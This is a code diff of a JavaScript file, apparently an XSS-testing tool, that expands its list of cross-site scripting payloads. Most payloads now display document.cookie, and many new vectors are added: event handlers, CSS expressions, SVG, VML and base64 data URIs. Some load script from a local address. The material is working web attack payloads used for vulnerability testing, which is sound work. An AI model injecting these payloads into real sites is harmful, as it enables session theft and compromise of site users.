@@ -31,36 +31,36 @@ var XSSattack = function(message){
 };
 
 var attackVariants = [
-  '><script>alert("You are vulnerable to a Standard XSS attack")</script>',
-  'javascript:alert("You are vulnerable to Non-Standard Javascript XSS attacks")',
-  '<a onmouseover="alert(\'You are vulnerable to Broken Tag XSS attacks\')">Injected Element</a>',
-  '><<SCRIPT>alert("You are vulnerable to an Extraneous Open Bracket XSS attack");//<</SCRIPT>',
-  '></TITLE><SCRIPT>alert("You are vulnerable to a Title Change XSS attack");</SCRIPT>',
+  '><script>alert("You are vulnerable to a Standard XSS attack: " + document.cookie)</script>',
+  'javascript:alert("You are vulnerable to Non-Standard Javascript XSS attacks: " + document.cookie)',
+  '<a onmouseover="alert(\'You are vulnerable to Broken Tag XSS attacks: \' + document.cookie)">Injected Element</a>',
+  '><<SCRIPT>alert("You are vulnerable to an Extraneous Open Bracket XSS attack: " + document.cookie);//<</SCRIPT>',
+  '></TITLE><SCRIPT>alert("You are vulnerable to a Title Change XSS attack: " + document.cookie);</SCRIPT>',
   '<IFRAME src="http://0.0.0.0:8000/non-alpha-xss.js"></IFRAME>',
   '><SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.js></SCRIPT>',
   '><SCRIPT/SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
-  '<IMG src="" onerror="alert(\'You are vulnerable to On-Error XSS attacks\')">',
+  '<IMG src="" onerror="alert(\'You are vulnerable to On-Error XSS attacks: \'+ document.cookie)">',
   '><SCRIPT SRC=http://0.0.0.0:8000/non-alpha-xss.jpg></SCRIPT>',
-  'data:text/html,<script>alert("You are vulnerable to a Data Injection XSS attack")</script>',
+  'data:text/html,<script>alert("You are vulnerable to a Data Injection XSS attack: " + document.cookie)</script>',
   '<a href=“?xss=<script>”>You are vulnerable to Click-Jacking XSS attacks</a>',
   '><SCRIPT a=">"SRC="http://0.0.0.0:8000/non-alpha-xss.js"></SCRIPT>',
-  "'><SCRIPT>alert('You are vulnerable to XSS')</SCRIPT><xss a='",
-  '<input onfocus="alert()" autofocus>',
-  '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
+  "'><SCRIPT>alert('You are vulnerable to XSS: ' + document.cookie)</SCRIPT><xss a='",
+  '<input onfocus="alert(document.cookie)" autofocus>',
+  '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;document.cookie&rpar;&gt;" />',
   'http://0.0.0.0:8000/non-alpha-xss.js',
-  '</script><script>alert(You are vulnerable to a Multiple Script Tag XSS attack)</script>',
-  '--><img onload="alert(1)" src="a.gif"/><--'
+  '</script><script>alert("You are vulnerable to a Multiple Script Tag XSS attack: " + document.cookie)</script>',
+  '--><img onload="alert(1)" src="a.gif"/><--',
+  '<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(document.cookie))%7d//["\'`-->]]>]</div><div id="30"><style>@import "data:,*%7bx:expression(alert(document.cookie))%7D";</style>//["\'`-->]]>]</div><div id="31"><frameset onload=alert(document.cookie)>//["\'`-->]]>]</div><div id="32"><table background="javascript:alert(document.cookie)"></table>//["\'`-->]]>]</div><div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(document.cookie);">XXX</a></a><a href="javascript:alert(document.cookie)">XXX</a>//["\'`-->]]>]</div><div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["\'`-->]]>]</div><div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(document.cookie) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["\'`-->]]>]</div><div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(document.cookie)">XXX</a>//["\'`-->]]>]</div><div id="37"><!--<img src="--><img src=x onerror=alert(document.cookie)//">//["\'`-->]]>]</div><div id="38"><comment><img src="</comment><img src=x onerror=alert(document.cookie)//">//["\'`-->]]>]</div>',
+  '<svg><![CDATA[><image xlink:href="]]><img src=xx:x onerror="alert(document.cookie)"//"></svg>//["\'`-->]]>]</div>',
+  '<div id="40"><style><img src="</style><img src=x onerror=alert(document.cookie)//">//["\'`-->]]>]</div>',
+  '<div id="44"><style>*[{}@import\'test.css?]{color: green;}</style>X//["\'`-->]]>]</div><div id="45"><div style="font-family:\'foo[a];color:red;\';">XXX</div>//["\'`-->]]>]</div><div id="46"><div style="font-family:foo}color=red;">XXX</div>//["\'`-->]]>]</div><div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>//["\'`-->]]>]</div><div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(document.cookie)</SCRIPT>//["\'`-->]]>]</div><div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(document.cookie)"></OBJECT>//["\'`-->]]>]</div><div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["\'`-->]]>]</div><div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["\'`-->]]>]</div><div id="52"><x style="behavior:url(test.sct)">//["\'`-->]]>]</div><'
 ];
 
 $.ajax({
 	type: "GET",
 	url: 'http://127.0.0.1:8080/',
 	success: function(data){
-		console.log('GET IS WORKING')
-		console.log(data + '')
-		console.log(document.URL)
 		if ((!data) || data === document.URL){
-			XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
 			$.ajax({
 				type: "POST",
 				url: 'http://127.0.0.1:8080/',
@@ -69,6 +69,7 @@ $.ajax({
 					console.log('post is working');
 				}
 			});
+			XSSattack(attackVariants[Math.floor(Math.random() * attackVariants.length)]);
 		} else {
 			window.history.back();
 		}
